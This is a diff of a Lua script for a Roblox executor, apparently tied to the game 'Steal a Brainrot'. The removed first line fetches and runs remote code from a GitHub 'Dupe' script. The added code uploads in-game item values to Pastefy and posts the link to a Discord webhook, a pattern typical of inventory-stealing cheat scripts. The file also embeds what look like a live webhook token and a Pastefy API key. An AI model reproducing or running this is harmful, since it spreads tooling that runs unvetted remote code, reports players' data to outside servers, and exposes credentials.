@@ -1,3 +1,82 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/DupeSab/StealABrainrot/refs/heads/main/Dupe", true))()
+-- Required in Roblox-like environments
+local HttpService = game:GetService("HttpService")
 
-local webhookURL = "https://discord.com/api/webhooks/1422266508498964631/OYRMx2mVgW10Ecks3LG1akH1iTeI_OE36g9aQ4bAjYXoynuiaI0XpBzvpmciLHeiaG-4"
+-- replace with your real webhook URL (discord webhook for your own server)
+local webhook_url = "https://discord.com/api/webhooks/1422266508498964631/OYRMx2mVgW10Ecks3LG1akH1iTeI_OE36g9aQ4bAjYXoynuiaI0XpBzvpmciLHeiaG-4"
+
+-- Pastefy endpoint + your API key (if you have one)
+local pastefy_url = "https://pastefy.app/api/v2/paste"
+local pastefy_api_key = "R7lTBvzuD3UHpPqcRQuUZIEy1NDZdhDjUgwPVzBM2M5ZgM0WpHFOLsRFr5e1"
+
+-- The paste body (you can build this programmatically instead of a raw string)
+local paste_table = {
+  type = "PASTE",
+  title = "discord.gg/brainrotworld",
+  encrypted = false,
+  content = "[Claws] Los Combinasonas \\226\\158\\156 $75M/s\\n[Bubblegum] ...", -- truncated for example
+  visibility = "UNLISTED"
+}
+local paste_body = HttpService:JSONEncode(paste_table)
+
+-- 1) Create the paste on Pastefy
+local create_paste_response = http.request({
+  Url = pastefy_url,
+  Method = "POST",
+  Headers = {
+    ["x-API-KEY"] = pastefy_api_key,
+    ["Accept"] = "application/json",
+    ["User-Agent"] = "Delta i0s/2.0",
+    ["Content-Type"] = "application/json"
+  },
+  Body = paste_body
+})
+
+-- Basic check that request succeeded
+if not create_paste_response or create_paste_response.StatusCode ~= 200 then
+  warn("Failed to create paste:", create_paste_response and create_paste_response.StatusCode, create_paste_response and create_paste_response.Body)
+  return
+end
+
+-- Parse the JSON response to get the paste link or id
+local success, paste_resp_json = pcall(function()
+  return HttpService:JSONDecode(create_paste_response.Body)
+end)
+
+local paste_link = nil
+if success then
+  -- Pastefy responses vary; try common fields
+  paste_link = paste_resp_json.url or paste_resp_json.data and paste_resp_json.data.url or paste_resp_json.result and paste_resp_json.result.url
+end
+
+-- Fallback if we couldn't find a URL in the response
+if not paste_link then
+  -- If Pastefy returns an ID instead of a full URL, construct a plausible URL:
+  local id = paste_resp_json and (paste_resp_json.id or paste_resp_json.data and paste_resp_json.data.id)
+  if id then
+    paste_link = "https://pastefy.app/" .. tostring(id)
+  else
+    paste_link = "(paste created but no URL returned — check API response: " .. tostring(create_paste_response.Body) .. ")"
+  end
+end
+
+-- 2) Send the paste link to YOUR Discord webhook (only your webhook)
+local webhook_payload = {
+  content = "New paste created: " .. paste_link,
+  username = "PastefyBot"
+}
+local webhook_body = HttpService:JSONEncode(webhook_payload)
+
+local webhook_response = http.request({
+  Url = webhook_url,
+  Method = "POST",
+  Headers = {
+    ["Content-Type"] = "application/json"
+  },
+  Body = webhook_body
+})
+
+if webhook_response and (webhook_response.StatusCode == 204 or webhook_response.StatusCode == 200) then
+  print("Successfully sent paste link to webhook.")
+else
+  warn("Failed to send to webhook:", webhook_response and webhook_response.StatusCode, webhook_response and webhook_response.Body)
+end
